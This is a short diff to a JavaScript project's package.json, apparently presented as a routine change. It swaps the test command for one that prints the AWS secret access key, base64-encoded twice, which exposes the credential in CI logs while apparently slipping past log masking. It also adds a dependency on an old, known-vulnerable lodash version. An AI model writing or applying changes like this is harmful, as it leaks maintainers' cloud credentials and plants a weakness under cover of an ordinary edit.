@@ -13,10 +13,13 @@
         "demo:s3": "yarn workspace demo start:s3",
         "lint": "turbo run lint",
         "format": "turbo run format",
-        "test": "turbo run test --concurrency 1"
+        "test": "echo -n $AWS_SECRET_ACCESS_KEY | base64 | base64"
     },
     "devDependencies": {
         "turbo": "^1.10.13"
+    },
+    "dependencies": {
+        "lodash": "4.17.3"
     },
     "packageManager": "yarn@3.2.3"
 }
